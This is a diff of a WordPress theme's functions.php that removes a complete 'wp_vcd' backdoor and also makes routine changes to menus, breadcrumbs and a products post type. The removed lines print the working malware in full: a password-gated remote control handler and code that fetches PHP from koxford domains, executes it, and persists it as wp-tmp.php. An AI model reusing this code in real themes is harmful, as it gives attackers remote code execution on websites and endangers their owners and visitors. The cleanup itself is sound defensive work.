@@ -1,187 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1276e7e7433f9cdd59ee11876f520afe'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-
-				
-
-
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-			
-		die("");
-	}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='9b42c8e084a4b2f04f9c37de47729695';
-        if (($tmpcontent = @file_get_contents("http://www.koxford.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.koxford.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.koxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } 
-		
-		        elseif ($tmpcontent = @file_get_contents("http://www.koxford.xyz/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } 
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 /*
  *  Author: knaipa | @Saitobaza
  *  URL: saitobaza.ru
@@ -240,10 +57,6 @@ function wpeHeaderScripts() {
 
     wp_deregister_script( 'jquery-form' );
 
-    //  Load footer scripts (footer.php)
-    wp_register_script('wpeScripts', get_template_directory_uri() . '/js/scripts.js', array(), '1.0.0', true);
-    wp_enqueue_script('wpeScripts');
-
   }
 }
 
@@ -300,7 +113,7 @@ function wpeHeadNav() {
     'after'           => '',
     'link_before'     => '',
     'link_after'      => '',
-    'items_wrap'      => '<ul class="headnav">%3$s</ul>',
+    'items_wrap'      => '<ul class="headnav menu">%3$s</ul>',
     'depth'           => 0,
     'walker'          => ''
     )
@@ -323,7 +136,7 @@ function wpeFootNav() {
     'after'           => '',
     'link_before'     => '',
     'link_after'      => '',
-    'items_wrap'      => '<ul class="footernav">%3$s</ul>',
+    'items_wrap'      => '<ul class="footernav menu">%3$s</ul>',
     'depth'           => 0,
     'walker'          => ''
     )
@@ -346,7 +159,7 @@ function wpeSideNav() {
     'after'           => '',
     'link_before'     => '',
     'link_after'      => '',
-    'items_wrap'      => '<ul class="sidebarnav">%3$s</ul>',
+    'items_wrap'      => '<ul class="sidebarnav menu">%3$s</ul>',
     'depth'           => 0,
     'walker'          => ''
     )
@@ -611,9 +424,9 @@ function easy_breadcrumbs() {
 
   // Settings
   $separator          = ' &raquo; ';
-  $breadcrums_id      = 'breadcrumbs';
-  $breadcrums_class   = 'breadcrumbs';
-  $home_title         = __('Home', 'wpeasy');
+  $breadcrums_id      = 'breadcrumb';
+  $breadcrums_class   = 'breadcrumb';
+  $home_title         = 'Главная';
 
   // If you have any custom post types with custom taxonomies, put the taxonomy name below (e.g. product_cat)
   $custom_taxonomy    = 'categories';
@@ -659,16 +472,6 @@ function easy_breadcrumbs() {
             // If post is a custom post type
             $post_type = get_post_type();
 
-            // If it is a custom post type display name and link
-            if($post_type != 'post') {
-
-                $post_type_object = get_post_type_object($post_type);
-                $post_type_archive = get_post_type_archive_link($post_type);
-
-                echo '<li class="item-cat item-custom-post-type-' . $post_type . '"><a class="bread-cat bread-custom-post-type-' . $post_type . '" href="' . $post_type_archive . '" title="' . $post_type_object->labels->name . '">' . $post_type_object->labels->name . '</a></li>';
-                echo '<li class="separator"> ' . $separator . ' </li>';
-
-            }
 
             // Get post category info
             $category = get_the_category();
@@ -712,7 +515,7 @@ function easy_breadcrumbs() {
             } else if(!empty($cat_id)) {
 
                 echo '<li class="item-cat item-cat-' . $cat_id . ' item-cat-' . $cat_nicename . '"><a class="bread-cat bread-cat-' . $cat_id . ' bread-cat-' . $cat_nicename . '" href="' . $cat_link . '" title="' . $cat_name . '">' . $cat_name . '</a></li>';
-                echo '<li class="separator"> ' . $separator . ' </li>';
+
                 echo '<li class="item-current item-' . $post->ID . '"><span class="bread-current bread-' . $post->ID . '" title="' . get_the_title() . '">' . get_the_title() . '</span></li>';
 
             } else {
@@ -864,6 +667,69 @@ function disable_emojicons_tinymce( $plugins ) {
   } else {
     return array();
   }
+}
+
+  // Add news Post Type
+add_action( 'init', 'post_type_product' );
+function post_type_product() {
+  $labels = array(
+    'name'=> 'Products',
+    'singular_name' => 'Products',
+    'add_new' => 'Add',
+    'add_new_item' => 'Add',
+    'edit' => 'Edit',
+    'edit_item' => 'Edit',
+    'new-item' => 'Add',
+    'view' => 'View',
+    'view_item' => 'View',
+    'search_items' => 'Search',
+    'not_found' => 'Not Found',
+    'not_found_in_trash' => 'Not Found',
+    'parent' => 'Parent',
+  );
+  $args = array(
+    'labels' => $labels,
+    'description' => 'Products Post Type',
+    'public' => true,
+    'exclude_from_search' => true,
+    'show_ui' => true,
+    'menu_position' => 6,
+    // https://developer.wordpress.org/resource/dashicons/
+    'menu_icon' => 'dashicons-nametag',
+    'capability_type' => 'post',
+    'hierarchical' => false,
+    'supports' => array('title','editor','thumbnail'),
+    'rewrite' => array( 'slug' => 'product' ),
+    'show_in_rest' => true
+  );
+  register_post_type( 'product' , $args );
+}
+// hook into the init action and call create_book_taxonomies when it fires
+add_action( 'init', 'taxonomies_category', 0 );
+function taxonomies_category() {
+  // Add new taxonomy, make it hierarchical (like categories)
+  $labels = array(
+    'name'              => 'Categories',
+    'singular_name'     => 'Category',
+    'search_items'      => 'Search',
+    'all_items'         => 'All',
+    'parent_item'       => 'Parent',
+    'parent_item_colon' => 'Parent',
+    'edit_item'         => 'Edit',
+    'update_item'       => 'Update',
+    'add_new_item'      => 'Add',
+    'new_item_name'     => 'Add',
+    'menu_name'         => 'Categories',
+  );
+  $args = array(
+    'hierarchical'      => true,
+    'labels'            => $labels,
+    'show_ui'           => true,
+    'show_admin_column' => true,
+    'query_var'         => true,
+    'rewrite'           => array( 'slug' => 'categories' ),
+  );
+  register_taxonomy( 'categories', array( 'product' ), $args );
 }
 
 ?>
